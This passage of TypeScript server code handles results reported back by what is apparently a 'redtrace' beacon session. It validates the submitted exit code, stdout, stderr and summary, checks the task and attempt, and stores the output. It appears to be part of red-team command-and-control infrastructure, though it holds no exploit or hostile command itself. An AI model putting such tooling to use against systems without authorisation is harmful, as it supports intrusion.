    const session = ops.session(c.params.session, String(c.req.headers['x-redtrace-session-token'] ?? '')), b = await body(c.req, Type.Object({ version: Type.Literal(1), attempt_id: text(64), completion: Type.Union([Type.Literal('known'), Type.Literal('unknown')]), exit_code: Type.Union([Type.Integer({ minimum: 0, maximum: 255 }), Type.Null()]), error_code: Type.Union(['COMMAND_FAILED', 'TRANSPORT_ERROR', 'AUTH_FAILED', 'PROTOCOL_ERROR', 'CAPABILITY_UNSUPPORTED', 'TIMEOUT', 'CANCELLED', 'UNKNOWN_RESULT'].map(v => Type.Literal(v)).concat(Type.Null() as any)), stdout: optional(Type.Union([Type.String({ maxLength: 2 * 1024 * 1024 }), Type.Null()])), stderr: optional(Type.Union([Type.String({ maxLength: 2 * 1024 * 1024 }), Type.Null()])), combined_output: Type.String({ maxLength: 2 * 1024 * 1024 }), summary: optional(Type.String({ maxLength: 1000 })) })), task = ops.task(c.params.operation)
    if (task.resource_id !== session.id) throw new HttpError(404, 'Task not found')
    if (['cancelled', 'rejected'].includes(task.status)) return { task: ops.publicTask(task) }
    if (task.attempt_id !== b.attempt_id) throw new HttpError(409, 'Stale execution attempt')
    if (task.status !== 'running') throw new HttpError(409, 'Task is not accepting results')
    const result = ops.finish(task.id, { version: 1, completion: b.completion, exit_code: b.exit_code, error_code: b.error_code as any, stdout: b.stdout ?? null, stderr: b.stderr ?? null, combined_output: b.combined_output, output_ref: null, truncated: false, execution_context: { resource_id: session.id, protocol: 'redtrace-beacon-v1' }, started_at: task.started_at ?? task.created_at, completed_at: now() })
    if (b.summary?.trim()) { db.prepare('UPDATE operation_tasks SET output_summary=? WHERE id=?').run(summarize(b.summary.trim()), task.id); return { task: ops.publicTask(ops.task(task.id)) } }
    return { task: result }
  })
}
